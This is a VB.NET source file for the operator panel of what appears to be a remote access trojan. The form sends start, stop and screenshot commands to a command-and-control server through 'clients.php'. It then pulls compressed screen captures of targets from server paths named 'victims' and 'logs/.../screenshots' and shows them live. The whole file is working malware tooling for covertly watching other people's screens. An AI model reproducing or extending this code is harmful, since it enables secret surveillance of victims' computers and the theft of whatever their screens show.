Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Text
Imports System.Threading

Public Class ScreenMonitor
    Public targetIp As String = ""
    Private transmissionThread As Threading.Thread = Nothing
    Private startMonitorSpamWC, fluxManagementWC As New WebClient()
    Private connectionEstablished As Boolean = False

    Private Sub ScreenMonitor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = "Screen Monitor  @ " & targetIp
    End Sub

    Private Function stringQualityToLong(quality As String) As Long
        If quality = "LOW" Then
            Return 25L
        ElseIf quality = "MEDIUM" Then
            Return 35L
        ElseIf quality = "HIGH" Then
            Return 45L
        Else
            Throw New ArgumentException()
        End If
    End Function

    Private Sub StartButton_Click(sender As Object, e As EventArgs) Handles StartButton.Click
        transmissionThread = New Threading.Thread(Sub() doTransmission(500 / Convert.ToInt32(FPS.SelectedItem)))
        transmissionThread.Start()
        StartButton.Text = "Loading..."
        StartButton.Enabled = False
        StopButton.Enabled = True
        Button3.Enabled = False
    End Sub
    Private Sub StopButton_Click(sender As Object, e As EventArgs) Handles StopButton.Click
        Dim client = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshare&actioncontent=stop")
        transmissionThread.Abort()
        Render.Image = Nothing
        StopButton.Enabled = False
        StartButton.Enabled = True
        Button3.Enabled = True
    End Sub
    Function DeflateDecompress(ByVal toDecompress As Byte()) As Byte()
        Try
            Using inputStream As MemoryStream = New MemoryStream(toDecompress)

                Using outputStream As MemoryStream = New MemoryStream()
                    Using decompressionStream As DeflateStream =
                    New DeflateStream(inputStream, CompressionMode.Decompress)
                        decompressionStream.CopyTo(outputStream)

                    End Using

                    Return outputStream.ToArray
                End Using
            End Using
        Catch ex As Exception
            Return {}
        End Try
    End Function

    Private Sub doTransmission(interval As Integer)
        Try
            Dim startTime = DateTime.Now

            Dim rawReceivedBytes As Byte() =
                fluxManagementWC.DownloadData(My.Settings.vpsurl & "victims/" & targetIp & "/screenshot")

            If rawReceivedBytes.Length = 0 Then
                Exit Try
            End If

            Console.WriteLine("received " & rawReceivedBytes.Length & " bytes")
            Render.Image = New Bitmap(New MemoryStream(DeflateDecompress(rawReceivedBytes)))
            Render.Refresh()

            Dim msTimeout As Integer = interval - Date.Now.Subtract(startTime).TotalMilliseconds
            Console.WriteLine("slept " & msTimeout)
            If msTimeout < 1 Then
                GC.Collect()
                Exit Try
            Else
                Thread.Sleep(msTimeout)
            End If

            connectionEstablished = True
        Catch ex As Exception When TypeOf ex Is WebException OrElse TypeOf ex Is ArgumentException
        End Try

        doTransmission(interval)
    End Sub

    Private Sub WaitForConnectionTimer_Tick(sender As Object, e As EventArgs) Handles WaitForConnectionTimer.Tick
        If Not StartButton.Enabled AndAlso Not connectionEstablished Then
            startMonitorSpamWC.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshare&actioncontent=start&actioncontent2=" & stringQualityToLong(Quality.SelectedItem.ToString) & "&actioncontent3=" & 1000 / FPS.SelectedItem)
        ElseIf connectionEstablished Then
            StartButton.Text = "Start Monitoring"
            ' StartButton.Enabled = False
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim s As String = "abcdefghijklmnopqrstvuwxyz"
        Dim r As New Random : Dim sb As New StringBuilder
        For i As Integer = 1 To 8
            Dim idx As Integer = r.Next(0, 26)
            sb.Append(s.Substring(idx, 1))
        Next

        Dim victimQuery = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshot&actioncontent=" & sb.ToString())
        Threading.Thread.Sleep(2000)
displayimage:
        Try
            Threading.Thread.Sleep(100)
            Render.Load(My.Settings.vpsurl & "logs/" & targetIp & "/screenshots/" & sb.ToString & ".jpeg")
        Catch ex As Exception
            GoTo displayimage
        End Try
    End Sub
End Class